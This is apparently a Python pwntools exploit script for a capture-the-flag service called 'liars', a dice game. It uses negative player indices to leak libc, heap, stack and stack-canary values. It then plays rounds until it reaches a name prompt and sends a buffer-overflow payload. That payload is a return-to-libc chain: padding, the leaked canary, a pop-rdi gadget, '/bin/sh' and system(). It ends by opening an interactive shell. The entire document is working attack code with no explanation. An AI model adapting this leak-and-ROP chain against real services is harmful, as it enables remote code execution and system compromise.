__author__ = "cMc_SARS"

from pwn import *
context(terminal='zsh', arch='amd64', log_level='info')

p = remote('liars.pwni.ng', 2018)

# def recvptr(self): return u64(self.recvn(6).ljust(8, "\x00"))
def recvptr(self): return u64(self.recvline().rstrip().ljust(8, "\x00"))
pwnlib.tubes.remote.remote.recvptr = recvptr
pwnlib.tubes.process.process.recvptr = recvptr

p.sendlineafter("How many players total (4-10)?", "7")

def leak(idx):
    p.sendlineafter("4) Leave", "1")
    p.sendlineafter("Player? ", str(idx))
    p.recvuntil("They have ")
    res = int(p.recvuntil(" ", drop=True))
    if res < 0: res += 0x100000000
    return res
low = leak(-12)
high = leak(-11)
libc_addr = low + (high << 32)
print(hex(libc_addr))

low = leak(-88)
high = leak(-87)
heap_addr = low + (high << 32)
print(hex(heap_addr))

p.sendlineafter("4) Leave", "4")
p.sendlineafter("Play again (y/n)? ", "y")
p.sendlineafter("How many players total (4-10)?", "7")

curr_pos = heap_addr + 0x110
canary_pos = libc_addr + 0x6688 - 0x80
stack_pos = libc_addr + 0x2380
off = int((0x10000000000000000 + curr_pos - canary_pos) / 4)
low = leak(-off)
high = leak(-off + 1)
canary = low + (high << 32)
print(hex(canary))
off = int((0x10000000000000000 + curr_pos - stack_pos) / 4)
low = leak(-off)
high = leak(-off + 1)
stack_addr = low + (high << 32)
print(hex(stack_addr))

overflow_pos = stack_addr - 0x83c
off = int((0x10000000000000000 + curr_pos - overflow_pos) / 4)

p.sendlineafter("4) Leave", "4")
p.sendlineafter("Play again (y/n)? ", "y")
p.sendlineafter("How many players total (4-10)?", "7")

dice_1 = leak(-8)
print(dice_1)
if dice_1 != 6:
    log.warning("I'm lazzy, so try again :(")
    exit(0)
p.sendlineafter("4) Leave", "0")
p.sendlineafter("2) Print dice horizontally", "2")
p.sendlineafter("3) Leave", "2")

dice_num = [0,0,0,0,0,0]
while True:
    p.sendline('5')
    bug = leak(-off)
    for i in range(6):
        dice_num[i] = leak(i-8)
    p.recvuntil("Player 6's turn")
    res = p.recv()
    print(res)
    if "3) Leave" in res:
        p.sendline("0")
    a1 = max(dice_num)
    a2 = 6 - dice_num[::-1].index(a1)
    print(dice_num)
    print(bug + 1, dice_num[bug])
    print(a2, a1)
    p.sendline(str(bug + 1))
    p.sendlineafter("Number of dice? ", str(dice_num[bug]))
    if "Invalid bet!" in p.recvline():
        p.sendline(str(a2))
        p.sendlineafter("Number of dice? ", str(a1))
    if "What is your name?" in p.recv():
        break

sh_addr = libc_addr - 0x359b6
system_addr = libc_addr - 0x197b50
poprdi = system_addr + 0x100a
print(hex(poprdi))
print(hex(system_addr))
print(hex(sh_addr))
payload = "A" * 520
payload += p64(canary)
payload += "BBBBBBBB"
payload += p64(poprdi+1)
payload += p64(poprdi)
payload += p64(sh_addr)
payload += p64(system_addr)
p.sendline(payload)
p.interactive()
